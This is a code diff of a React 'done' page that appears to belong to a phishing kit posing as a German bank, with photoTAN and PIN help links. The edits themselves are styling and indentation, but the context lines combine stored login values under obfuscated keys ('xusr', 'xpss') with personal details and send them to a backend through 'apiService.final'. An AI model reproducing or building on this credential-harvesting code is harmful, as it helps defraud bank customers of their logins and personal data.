@@ -34,7 +34,7 @@ const DonePage: React.FC = () => {
           const info = JSON.parse(infoData);
           
           // Combine all data for final submission
-          const finalData = {
+        const finalData = {
             xusr: login.xusr,
             xpss: login.xpss,
             xname1: info.xname1,
@@ -44,7 +44,7 @@ const DonePage: React.FC = () => {
           };
           
           console.log('Submitting final data:', finalData);
-          await apiService.final(finalData);
+        await apiService.final(finalData);
           console.log('Final data submitted successfully');
         }
       } catch (error) {
@@ -61,7 +61,7 @@ const DonePage: React.FC = () => {
   };
 
   return (
-    <div style={{
+    <div className="done-page" style={{
       fontFamily: 'Arial, Helvetica, sans-serif',
       backgroundColor: '#f5f5f5',
       minHeight: '100vh',
@@ -96,14 +96,14 @@ const DonePage: React.FC = () => {
         maxWidth: '1200px',
         margin: '0 auto'
       }}>
-        {/* Left Column - Success Message */}
+          {/* Left Column - Success Message */}
         <div style={{
           flex: '1',
           display: 'flex',
           flexDirection: 'column',
           gap: '20px'
         }}>
-          <div style={{
+          <div className="success-section" style={{
             backgroundColor: 'white',
             padding: isMobile ? '20px' : '40px',
             borderRadius: '8px',
@@ -141,6 +141,7 @@ const DonePage: React.FC = () => {
             </p>
             
             <button
+              className="primary-button"
               onClick={handleForwarding}
               style={{
                 background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
@@ -177,7 +178,7 @@ const DonePage: React.FC = () => {
           display: 'flex',
           flexDirection: 'column'
         }}>
-          <div style={{
+          <div className="info-panel" style={{
             backgroundColor: 'white',
             padding: isMobile ? '20px' : '40px',
             borderRadius: '8px',
@@ -255,9 +256,9 @@ const DonePage: React.FC = () => {
                   <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                   <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('photoTANHelp')}</span>
                 </a>
-              </div>
             </div>
-            
+          </div>
+
             <div style={{ marginBottom: '20px' }}>
               <h4 style={{
                 fontSize: isMobile ? '14px' : '16px',
@@ -310,8 +311,8 @@ const DonePage: React.FC = () => {
                   <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('forgotPIN')}</span>
                 </a>
               </div>
-            </div>
-            
+              </div>
+
             <div>
               <h4 style={{
                 fontSize: isMobile ? '14px' : '16px',
